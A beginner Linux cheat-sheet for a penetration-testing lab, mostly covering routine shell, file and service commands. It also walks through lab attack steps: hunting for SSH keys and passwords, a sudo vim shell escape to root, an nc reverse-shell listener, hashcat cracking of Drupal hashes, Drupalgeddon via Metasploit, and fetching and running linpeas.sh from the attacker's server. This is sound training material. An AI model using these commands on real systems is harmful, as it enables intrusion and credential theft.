# 00 — Beginner Linux Commands Cheat-Sheet

> **Print this.** Every Linux command you'll use tomorrow on Kali / LinSRV1 / the CMS target. Plain English, real examples, in the order you'll need them.

---

## How a Linux terminal works (30-second crash course)

You type a command + arguments → press Enter → output appears.

```
$ command argument1 argument2
```

- The `$` is the **prompt** — don't type it, it's already there.
- Spaces separate the parts.
- Press **Up arrow** to recall the previous command.
- Press **Tab** to auto-complete file/folder names.
- Press **Ctrl+C** to abort a running command.

---

## 1. Where am I? Moving around

| Command | What it does | Example |
|---|---|---|
| `pwd` | "Print Working Directory" — show where I am | `pwd` → `/home/kali` |
| `ls` | List files in current folder | `ls` → `Desktop  Documents  Downloads` |
| `ls -la` | List ALL files (including hidden) with details | `ls -la` shows permissions, owner, size, date |
| `cd <folder>` | Change Directory | `cd Documents` |
| `cd ..` | Go up one folder | `cd ..` |
| `cd ~` | Go to your home folder | `cd ~` |
| `cd /` | Go to the root of the filesystem | `cd /` |

> **Tab completion is your friend.** Type `cd Doc` then press Tab → it auto-fills `Documents/`.

---

## 2. Reading files

| Command | What it does | When to use |
|---|---|---|
| `cat <file>` | Print whole file to screen | Short files (< 50 lines) |
| `less <file>` | Open file in a pager (scroll with arrow keys, exit with `q`) | Long files |
| `head <file>` | Show first 10 lines | Just need the top |
| `head -5 <file>` | Show first 5 lines | Custom count |
| `tail <file>` | Show last 10 lines | Just need the bottom |
| `tail -f <file>` | Follow a file as it grows (logs!) | Watching `/var/log/` while testing |
| `grep "word" <file>` | Find lines containing "word" | Searching | 

**Examples you'll use tomorrow:**
```bash
cat /etc/passwd                          # see all users on a Linux box
cat secret.txt                           # read a flag file
grep -i "password" config.php            # find password references (-i = case-insensitive)
tail -f /var/log/auth.log                # watch login attempts in real time
```

---

## 3. Finding files

| Command | What it does |
|---|---|
| `find / -name "filename"` | Find a file anywhere on the system |
| `find / -name "*.txt" 2>/dev/null` | Find all .txt files (and hide errors) |
| `find / -perm -4000 2>/dev/null` | Find SUID files (privesc-relevant!) |
| `which <command>` | Where is this command installed? |
| `locate <file>` | Fast filename search (uses index) |

**Examples:**
```bash
find / -name "id_rsa" 2>/dev/null        # hunt for SSH private keys
find /home -name "*.txt" 2>/dev/null     # all txt files in home dirs
which python3                            # → /usr/bin/python3
```

> The `2>/dev/null` part hides "Permission denied" errors so output is clean.

---

## 4. Permissions, users, sudo

| Command | What it does |
|---|---|
| `whoami` | Who am I logged in as? |
| `id` | My user ID + group memberships |
| `sudo <command>` | Run command as root (will ask for password) |
| `sudo -l` | What can I sudo as? **Critical for privesc** |
| `su - <user>` | Switch to another user |
| `chmod 600 file` | Make file readable+writable by owner only |
| `chmod +x script.sh` | Make a script executable |

**Privilege escalation gold (you'll do this in MA1):**
```bash
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/vim
sudo /usr/bin/vim -c ':!/bin/bash'
# You're now root.
```

---

## 5. Network tools (Day 1 MA1 + Day 3 verification)

### `nmap` — port + service scanner
```bash
nmap 192.168.2.1                         # quick scan
nmap -sC -sV -T4 192.168.2.1             # scan + version detect (RECOMMENDED for MA1)
nmap -p- 192.168.2.1                     # ALL 65535 ports (slower)
nmap -sF 192.168.2.1                     # FIN scan (triggers Snort on Day 2)
```
> `-sC` = run default safety scripts. `-sV` = identify service version. `-T4` = faster timing.

### `curl` — fetch URLs from terminal
```bash
curl http://192.168.2.1                  # fetch homepage (text dump)
curl -I http://192.168.2.1               # just headers (status, server)
curl -s http://target/file -o save.html  # save output to file silently
curl -k https://self-signed-site         # ignore cert errors
curl -X POST http://api/endpoint -d '{"key":"value"}' -H "Content-Type: application/json"
```

### `ssh` — remote shell
```bash
ssh user@192.168.2.1                     # default port 22
ssh -p 2022 C1@linsrv1                   # custom port (LinSRV1 in MA2)
ssh -i ~/.ssh/id_rsa user@host           # use specific key
```
First connection → answer `yes` to the fingerprint prompt.

### `nc` (netcat) — Swiss army knife
```bash
nc -nv 192.168.2.1 22                    # connect + see SSH banner
nc -lvnp 4444                            # listen on port 4444 (reverse shells)
```

### `nslookup` / `dig` — DNS
```bash
nslookup www.manila.com                  # resolve a hostname
dig www.manila.com                       # more detailed
```

### `ping` — basic reachability
```bash
ping 192.168.2.1                         # press Ctrl+C to stop
ping -c 4 192.168.2.1                    # 4 pings then stop
```

---

## 6. Password cracking (Day 1 MA1 Task 3)

### `hashcat` — fast GPU/CPU cracker
```bash
# Drupal 7 hash (your MA1 john user)
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt

# General format
hashcat -m <mode> <hashfile> <wordlist>
```

Common `-m` modes:
| Mode | Hash type |
|---|---|
| 0 | MD5 |
| 100 | SHA-1 |
| 1400 | SHA-256 |
| 1800 | Linux `/etc/shadow` (sha512crypt) |
| **7900** | **Drupal 7** (← MA1) |
| 1000 | NTLM (Windows) |

If the wordlist isn't extracted yet:
```bash
gunzip -k /usr/share/wordlists/rockyou.txt.gz
```

### `john` — alternative cracker
```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 7. Database (after popping a CMS)

```bash
mysql -u user -ppassword dbname                    # connect
mysql -u drupal -pdrupalpass drupal                # MA1 example

# Inside mysql:
SHOW TABLES;
SELECT * FROM users;
SELECT uid,name,pass FROM users;
exit
```

> Note: no space between `-p` and the password.

---

## 8. File transfer (between Kali and target)

### Spin up a quick web server (on Kali)
```bash
cd ~/tools
python3 -m http.server 8000
# Now any file in ~/tools is at http://kali_ip:8000/filename
```

### Download from target to Kali
```bash
# On target:
curl http://kali_ip:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Or with wget:
wget http://kali_ip:8000/linpeas.sh
```

### Copy via SCP
```bash
scp file user@host:/path/                          # upload
scp user@host:/path/file ./                        # download
scp -P 2022 file C1@linsrv1:/tmp/                  # custom port
```

---

## 9. Process + service management

```bash
ps aux                                   # all running processes
ps aux | grep apache                     # filter for apache
top                                      # live process view (q to quit)
systemctl status sshd                    # service state
systemctl restart httpd                  # restart httpd
systemctl enable --now firewalld         # enable + start now
```

---

## 10. Editing files (you'll need ONE editor)

### `nano` (beginner-friendly, recommended)
```bash
nano /etc/ssh/sshd_config
# Edit using arrow keys + typing.
# Ctrl+O → save (then Enter to confirm filename)
# Ctrl+X → exit
```

### `vi` / `vim` (advanced — only for MA1 privesc)
```bash
vim file.txt
# Press i → insert mode, type away
# Press Esc → exit insert mode
# Type :wq → save + quit
# Type :q! → quit without saving
```

---

## 11. Bash quick wins

```bash
# Save command output to file
nmap 192.168.2.1 > scan.txt

# Append to file
echo "note" >> notes.txt

# Pipe one command into another
cat /etc/passwd | grep root

# Run two commands in sequence
cd ~/ma1 && nmap 192.168.2.1

# Run command in background
./long_running.sh &

# Variables
TGT=192.168.2.1
nmap -sV $TGT
```

---

## 12. The "I'm lost" recovery commands

| Command | What it does |
|---|---|
| `clear` | Clear the screen |
| `history` | Show all commands you've typed |
| `Ctrl+R` | Search command history (start typing) |
| `Ctrl+L` | Same as `clear` |
| `Ctrl+C` | Cancel running command |
| `exit` or `Ctrl+D` | Close terminal / log out |

---

## The 12 commands you'll absolutely use tomorrow

> 🧠 **MEMORIZE WITH TEAMMATE — all 12.** Drill: Member A says "MA1 Task 1 command?" Member B recites. Goal: both can type each line from memory tomorrow morning.

```bash
nmap -sC -sV -T4 192.168.2.1                     # MA1 Task 1
curl -s http://192.168.2.1/CHANGELOG.txt         # MA1 Task 2
msfconsole                                        # MA1 Task 2 (Drupalgeddon)
hashcat -m 7900 hash.txt rockyou.txt              # MA1 Task 3
ssh john@192.168.2.1                              # MA1 Task 3
sudo -l                                           # MA1 Task 4
sudo /usr/bin/vim -c ':!/bin/bash'                # MA1 Task 4 privesc
cat /root/proof.txt                               # MA1 Task 4 flag

ssh -p 2022 C1@linsrv1                            # MA2 verification
sudo systemctl restart sshd                       # MA2 LinSRV1
firewall-cmd --reload                             # MA2 LinSRV1
sestatus                                          # MA2 SELinux check
```

Memorise these 12 and you're set.

---

## What if I freeze and can't remember?

1. Type the command name + `--help`:
   ```bash
   nmap --help
   curl --help
   ```
2. Or `man <command>` for full manual (press `q` to exit):
   ```bash
   man find
   ```
3. Or in your offline GTFOBins / HackTricks PDFs on the USB.

You don't need to *remember* every flag — you need to know **the command exists** and **what it does**. Look up the exact flags when needed.
